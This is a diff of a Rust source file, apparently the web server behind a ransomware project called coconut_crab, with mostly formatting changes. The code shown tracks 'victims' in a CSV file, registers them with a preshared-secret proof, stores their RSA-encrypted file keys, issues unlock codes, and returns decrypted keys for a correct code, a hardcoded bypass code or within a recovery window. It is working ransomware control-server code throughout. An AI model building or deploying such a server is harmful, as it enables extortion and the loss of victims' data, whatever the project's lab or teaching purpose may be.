@@ -1,35 +1,35 @@
-use axum::{ routing::post, Router, extract::{ self, State } };
+use axum::{
+    extract::{self, State},
+    routing::post,
+    Router,
+};
+use axum_embed::ServeEmbed;
 use axum_server::tls_rustls::RustlsConfig;
-use serde::{ Deserialize, Serialize };
-use csv::{ ReaderBuilder, WriterBuilder };
+use csv::{ReaderBuilder, WriterBuilder};
+use hex::{decode, encode};
+use log::{debug, error, info, warn};
+use rand::{rngs::StdRng, Rng, SeedableRng};
+use rsa::{pkcs1::DecodeRsaPrivateKey, Pkcs1v15Encrypt, RsaPrivateKey};
+use rust_embed::RustEmbed;
+use serde::{Deserialize, Serialize};
 use std::{
-    path::Path as FileSystemPath,
     fs::File,
-    sync::{ Arc, Mutex },
     net::SocketAddr,
+    path::Path as FileSystemPath,
+    sync::{Arc, Mutex},
     time::SystemTime,
 };
-use rand::{ Rng, SeedableRng, rngs::StdRng };
-use hex::{ encode, decode };
-use rsa::{ RsaPrivateKey, pkcs1::DecodeRsaPrivateKey, Pkcs1v15Encrypt };
-use rust_embed::RustEmbed;
-use axum_embed::ServeEmbed;
-use log::{ debug, error, info, warn };
 
 use coconut_crab_lib::{
+    file::get_exe_path_dir,
     web::{
-        server_tls::{ get_tls_public_key, get_tls_private_key },
-        structs::{ Registration, UploadSymKey, AnnounceCompletion, DownloadSymKey },
+        server_tls::{get_tls_private_key, get_tls_public_key},
+        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
         validate::{
-            validate_id,
-            validate_hostname,
-            validate_key,
-            validate_code,
+            check_proof, validate_code, validate_hostname, validate_id, validate_key,
             validate_proof,
-            check_proof,
         },
     },
-    file::get_exe_path_dir,
 };
 
 #[derive(Deserialize, Serialize, Debug, Clone)]
@@ -85,13 +85,18 @@ static BYPASS_CODE: &str = "2NSd-NRF3-qkB3-v6qP";
 
 #[tokio::main]
 async fn main() {
-    env_logger::Builder::new().filter_level(log::LevelFilter::Debug).init();
+    env_logger::Builder::new()
+        .filter_level(log::LevelFilter::Debug)
+        .init();
 
     let exe_directory_path = get_exe_path_dir();
 
     let file_path = format!("{}/victims.csv", exe_directory_path.to_string_lossy());
     let victims = import_csv(&file_path);
-    let shared_state = AppState { victims: Arc::new(Mutex::new(victims)), file_path };
+    let shared_state = AppState {
+        victims: Arc::new(Mutex::new(victims)),
+        file_path,
+    };
     debug!("Web Application State Configured");
 
     let serve_public_assets = ServeEmbed::<AssetPublic>::new();
@@ -109,21 +114,21 @@ async fn main() {
     debug!("Socket Address Configured");
 
     if HTTPS {
-        let config = RustlsConfig::from_pem(
-            get_tls_public_key(),
-            get_tls_private_key()
-        ).await.expect("Failed to configure web server TLS");
+        rustls::crypto::aws_lc_rs::default_provider().install_default().expect("Failed to install rustls crypto provider");
+        let config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key())
+            .await
+            .expect("Failed to configure web server TLS");
         debug!("TLS Configured");
 
-        axum_server
-            ::bind_rustls(addr, config)
-            .serve(app.into_make_service()).await
+        axum_server::bind_rustls(addr, config)
+            .serve(app.into_make_service())
+            .await
             .expect("Failed to start web server");
         debug!("Web Server Started")
     } else {
-        axum_server
-            ::bind(addr)
-            .serve(app.into_make_service()).await
+        axum_server::bind(addr)
+            .serve(app.into_make_service())
+            .await
             .expect("Failed to start web server");
         debug!("Web Server Started")
     }
@@ -164,17 +169,18 @@ fn export_csv<P: AsRef<FileSystemPath>>(file_path: P, victims: &[Victim]) {
     let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
 
     for victim in victims.iter() {
-        writer.serialize(victim).expect("Failed to serialize victims");
+        writer
+            .serialize(victim)
+            .expect("Failed to serialize victims");
     }
 
     writer.flush().expect("Failed to flush to file");
 }
 
 fn get_victim<'a>(victims: &'a mut [Victim], id: &str) -> Option<&'a mut Victim> {
-    if
-        let Some(existing_victim) = victims
-            .iter_mut()
-            .find(|existing_victim| existing_victim.id == *id)
+    if let Some(existing_victim) = victims
+        .iter_mut()
+        .find(|existing_victim| existing_victim.id == *id)
     {
         Some(existing_victim)
     } else {
@@ -222,8 +228,10 @@ fn decrypt_key(key: &str) -> String {
     let pem = String::from_utf8(
         AssetPrivate::get("asym-priv-key.pem")
             .expect("Failed to get private RSA key file")
-            .data.to_vec()
-    ).expect("Failed to read PEM file");
+            .data
+            .to_vec(),
+    )
+    .expect("Failed to read PEM file");
     let private_key = RsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key");
     let key_vec = match decode(key) {
         Ok(key_array_result) => {
@@ -250,7 +258,7 @@ fn decrypt_key(key: &str) -> String {
 
 async fn register(
     State(state): State<AppState>,
-    extract::Json(registration): extract::Json<Registration>
+    extract::Json(registration): extract::Json<Registration>,
 ) -> String {
     info!("Received request to register");
 
@@ -262,24 +270,39 @@ async fn register(
     }
 
     if validate_hostname(&registration.hostname) {
-        debug!("[{}] Valid Hostname: {}", registration.id, registration.hostname);
+        debug!(
+            "[{}] Valid Hostname: {}",
+            registration.id, registration.hostname
+        );
     } else {
-        warn!("[{}] Invalid Hostname: {}", registration.id, registration.hostname);
+        warn!(
+            "[{}] Invalid Hostname: {}",
+            registration.id, registration.hostname
+        );
         return String::from("Invalid Hostname");
     }
 
     if validate_proof(&registration.proof) {
         debug!("[{}] Valid Proof: {}", registration.id, registration.proof);
     } else {
-        warn!("[{}] Invalid Proof: {}", registration.id, registration.proof);
+        warn!(
+            "[{}] Invalid Proof: {}",
+            registration.id, registration.proof
+        );
         return String::from("Invalid Proof");
     }
 
     let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
     if check_proof(&mut proof_source, PRESHARED_SECRET, &registration.proof) {
-        debug!("[{}] Proof Verification Success: {}", registration.id, registration.proof);
+        debug!(
+            "[{}] Proof Verification Success: {}",
+            registration.id, registration.proof
+        );
     } else {
-        warn!("[{}] Proof Verification Failure: {}", registration.id, registration.proof);
+        warn!(
+            "[{}] Proof Verification Failure: {}",
+            registration.id, registration.proof
+        );
         return String::from("Invalid Proof");
     }
 
@@ -287,7 +310,10 @@ async fn register(
         let mut victims = state.victims.lock().expect("Mutex was poisoned");
         match get_victim(&mut victims, &registration.id) {
             Some(existing_victim) => {
-                warn!("[{}] Existing Victim Found: {:?}", registration.id, existing_victim);
+                warn!(
+                    "[{}] Existing Victim Found: {:?}",
+                    registration.id, existing_victim
+                );
                 warn!("[{}] Cannot Register New Victim", registration.id);
                 String::from("Victim already exists")
             }
@@ -312,7 +338,7 @@ async fn register(
 
 async fn upload_sym_key(
     State(state): State<AppState>,
-    extract::Json(uploadsymkey): extract::Json<UploadSymKey>
+    extract::Json(uploadsymkey): extract::Json<UploadSymKey>,
 ) -> String {
     info!("Received request to upload symmetric key");
 
@@ -333,15 +359,24 @@ async fn upload_sym_key(
     if validate_proof(&uploadsymkey.proof) {
         debug!("[{}] Valid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
     } else {
-        warn!("[{}] Invalid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
+        warn!(
+            "[{}] Invalid Proof: {}",
+            uploadsymkey.id, uploadsymkey.proof
+        );
         return String::from("Invalid Proof");
     }
 
     let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
     if check_proof(&mut proof_source, PRESHARED_SECRET, &uploadsymkey.proof) {
-        debug!("[{}] Proof Verification Success: {}", uploadsymkey.id, uploadsymkey.proof);
+        debug!(
+            "[{}] Proof Verification Success: {}",
+            uploadsymkey.id, uploadsymkey.proof
+        );
     } else {
-        warn!("[{}] Proof Verification Failure: {}", uploadsymkey.id, uploadsymkey.proof);
+        warn!(
+            "[{}] Proof Verification Failure: {}",
+            uploadsymkey.id, uploadsymkey.proof
+        );
         return String::from("Invalid Proof");
     }
 
@@ -350,11 +385,17 @@ async fn upload_sym_key(
         match get_victim(&mut victims, &uploadsymkey.id) {
             Some(existing_victim) => {
                 existing_victim.key = uploadsymkey.key;
-                info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, existing_victim.key);
+                info!(
+                    "[{}] Added Symmetric Key: {}",
+                    uploadsymkey.id, existing_victim.key
+                );
                 existing_victim.code = generate_code();
                 info!("[{}] Added Code: {}", uploadsymkey.id, existing_victim.code);
                 existing_victim.upload_time = get_epoch_time();
-                info!("[{}] Added Upload Time: {:?}", uploadsymkey.id, existing_victim.upload_time);
+                info!(
+                    "[{}] Added Upload Time: {:?}",
+                    uploadsymkey.id, existing_victim.upload_time
+                );
                 export_csv(&state.file_path, &victims);
                 debug!("Updated Victims CSV");
                 String::from("Success")
@@ -370,36 +411,47 @@ async fn upload_sym_key(
 
 async fn announce_completion(
     State(state): State<AppState>,
-    extract::Json(announcecompletion): extract::Json<AnnounceCompletion>
+    extract::Json(announcecompletion): extract::Json<AnnounceCompletion>,
 ) -> String {
     info!("Received request to announce completion");
 
     if validate_id(&announcecompletion.id) {
-        debug!("[{}] Valid ID: {}", announcecompletion.id, announcecompletion.id);
+        debug!(
+            "[{}] Valid ID: {}",
+            announcecompletion.id, announcecompletion.id
+        );
     } else {
         warn!("[] Invalid ID: {}", announcecompletion.id);
         return String::from("Invalid ID");
     }
 
     if validate_proof(&announcecompletion.proof) {
-        debug!("[{}] Valid Proof: {}", announcecompletion.id, announcecompletion.proof);
+        debug!(
+            "[{}] Valid Proof: {}",
+            announcecompletion.id, announcecompletion.proof
+        );
     } else {
-        warn!("[{}] Invalid Proof: {}", announcecompletion.id, announcecompletion.proof);
+        warn!(
+            "[{}] Invalid Proof: {}",
+            announcecompletion.id, announcecompletion.proof
+        );
         return String::from("Invalid Proof");
     }
 
     let mut proof_source = announcecompletion.id.as_bytes().to_vec();
-    if check_proof(&mut proof_source, PRESHARED_SECRET, &announcecompletion.proof) {
+    if check_proof(
+        &mut proof_source,
+        PRESHARED_SECRET,
+        &announcecompletion.proof,
+    ) {
         debug!(
             "[{}] Proof Verification Success: {}",
-            announcecompletion.id,
-            announcecompletion.proof
+            announcecompletion.id, announcecompletion.proof
         );
     } else {
         warn!(
             "[{}] Proof Verification Failure: {}",
-            announcecompletion.id,
-            announcecompletion.proof
+            announcecompletion.id, announcecompletion.proof
         );
         return String::from("Invalid Proof");
     }
@@ -425,7 +477,7 @@ async fn announce_completion(
 
 async fn download_sym_key(
     State(state): State<AppState>,
-    extract::Json(downloadsymkey): extract::Json<DownloadSymKey>
+    extract::Json(downloadsymkey): extract::Json<DownloadSymKey>,
 ) -> String {
     info!("Received request to download symmetric key");
 
@@ -437,24 +489,42 @@ async fn download_sym_key(
     }
 
     if validate_code(&downloadsymkey.code) {
-        debug!("[{}] Valid Code: {}", downloadsymkey.id, downloadsymkey.code);
+        debug!(
+            "[{}] Valid Code: {}",
+            downloadsymkey.id, downloadsymkey.code
+        );
     } else {
-        warn!("[{}] Invalid Code: {}", downloadsymkey.id, downloadsymkey.code);
+        warn!(
+            "[{}] Invalid Code: {}",
+            downloadsymkey.id, downloadsymkey.code
+        );
         return String::from("Invalid Code");
     }
 
     if validate_proof(&downloadsymkey.proof) {
-        debug!("[{}] Valid Proof: {}", downloadsymkey.id, downloadsymkey.proof);
+        debug!(
+            "[{}] Valid Proof: {}",
+            downloadsymkey.id, downloadsymkey.proof
+        );
     } else {
-        warn!("[{}] Invalid Proof: {}", downloadsymkey.id, downloadsymkey.proof);
+        warn!(
+            "[{}] Invalid Proof: {}",
+            downloadsymkey.id, downloadsymkey.proof
+        );
         return String::from("Invalid Proof");
     }
 
     let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
     if check_proof(&mut proof_source, PRESHARED_SECRET, &downloadsymkey.proof) {
-        debug!("[{}] Proof Verification Success: {}", downloadsymkey.id, downloadsymkey.proof);
+        debug!(
+            "[{}] Proof Verification Success: {}",
+            downloadsymkey.id, downloadsymkey.proof
+        );
     } else {
-        warn!("[{}] Proof Verification Failure: {}", downloadsymkey.id, downloadsymkey.proof);
+        warn!(
+            "[{}] Proof Verification Failure: {}",
+            downloadsymkey.id, downloadsymkey.proof
+        );
         return String::from("Invalid Proof");
     }
 
@@ -463,7 +533,10 @@ async fn download_sym_key(
         let mut victims = state.victims.lock().expect("Mutex was poisoned");
         existing_victim = match get_victim(&mut victims, &downloadsymkey.id) {
             Some(get_victim_result) => {
-                debug!("[{}] Existing Victim Found: {:?}", downloadsymkey.id, get_victim_result);
+                debug!(
+                    "[{}] Existing Victim Found: {:?}",
+                    downloadsymkey.id, get_victim_result
+                );
                 get_victim_result.clone()
             }
             None => {
@@ -481,11 +554,20 @@ async fn download_sym_key(
             error!("[{}] No Upload Time Recorded", downloadsymkey.id);
         } else {
             let current_time = get_epoch_time();
-            debug!("[{}] Current Epoch Time: {} seconds", downloadsymkey.id, current_time);
+            debug!(
+                "[{}] Current Epoch Time: {} seconds",
+                downloadsymkey.id, current_time
+            );
             let recovery_window = RECOVERY_WINDOW * 60;
-            debug!("[{}] Key Recovery Window: {} seconds", downloadsymkey.id, recovery_window);
+            debug!(
+                "[{}] Key Recovery Window: {} seconds",
+                downloadsymkey.id, recovery_window
+            );
             let elapsed_time = current_time - existing_victim.upload_time;
-            debug!("[{}] Elapsed Time: {} seconds", downloadsymkey.id, elapsed_time);
+            debug!(
+                "[{}] Elapsed Time: {} seconds",
+                downloadsymkey.id, elapsed_time
+            );
             if elapsed_time <= recovery_window {
                 recovery_valid = true;
             }
@@ -497,15 +579,20 @@ async fn download_sym_key(
         }
     }
 
-    if
-        existing_victim.code == downloadsymkey.code ||
-        downloadsymkey.code == BYPASS_CODE ||
-        recovery_valid
+    if existing_victim.code == downloadsymkey.code
+        || downloadsymkey.code == BYPASS_CODE
+        || recovery_valid
     {
-        info!("[{}] Correct Code: {}", downloadsymkey.id, downloadsymkey.code);
+        info!(
+            "[{}] Correct Code: {}",
+            downloadsymkey.id, downloadsymkey.code
+        );
         info!("[{}] Providing Decrypted Key", downloadsymkey.id);
         return decrypt_key(&existing_victim.key);
     }
-    warn!("[{}] Incorrect Code: {}", downloadsymkey.id, downloadsymkey.code);
+    warn!(
+        "[{}] Incorrect Code: {}",
+        downloadsymkey.id, downloadsymkey.code
+    );
     "Invalid Code".to_string()
 }
